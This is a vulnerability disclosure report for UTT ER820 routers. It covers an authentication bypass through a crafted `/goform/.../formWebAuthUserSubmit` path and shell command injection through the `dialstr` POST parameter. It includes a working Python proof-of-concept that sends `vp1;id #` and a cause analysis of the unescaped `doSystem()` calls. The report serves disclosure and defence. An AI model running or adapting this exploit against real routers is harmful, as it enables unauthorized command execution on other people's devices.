# CVE Report - Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers

## Vulnerability Title

Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers (formL2tpDial / sub_446E04)

## Vulnerability Description

UTT ER820 devices expose the GoAhead `websFormHandler` endpoint `formL2tpDial` (mapped to function `sub_446E04`, range `0x446e48-0x446fa4`) which can be reached via an authentication bypass, and then abused for command injection. Remote attackers can inject shell metacharacters via the POST parameter `dialstr`, leading to arbitrary command execution.

## POC

```py
import requests
import sys

def exploit(base_url: str):
    # auth bypass gadget: /goform/<target_form>/goform/formWebAuthUserSubmit
    url = base_url.rstrip('/') + '/goform/formL2tpDial/goform/formWebAuthUserSubmit'
    data = {
        'dialstr': 'vp1;id #',
    }
    requests.post(url, data=data, timeout=5)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('usage: python poc.py http://target')
        raise SystemExit(1)
    exploit(sys.argv[1])
    print('sent')
```

## Cause Analysis

1. **authentication**: In `websSecurityHandler`, URLs that contain the substrings `/goform/formWebAuthUserSubmit` or `/goform/formWebAuthOk` are forwarded directly to `websFormHandler`. Because the form handler resolution can be confused by crafting a path like `/goform/formL2tpDial/goform/formWebAuthUserSubmit`, attackers can reach `formL2tpDial` without valid authentication.

2. **command injection**: In `sub_446E04`, user input is read from the HTTP parameter `dialstr` via `websGetVar`, tokenized with `strtok`, and then inserted into multiple `doSystem()` calls (e.g., `doSystem("l2tp-down.sh l2tp_%s ", v3)` and `doSystem("echo 'd %s' > %s", v3, ...)`) without proper escaping/quoting. If the token contains shell metacharacters (e.g., `;`, `` ` ``, `$()`), the command line is altered and arbitrary commands execute.
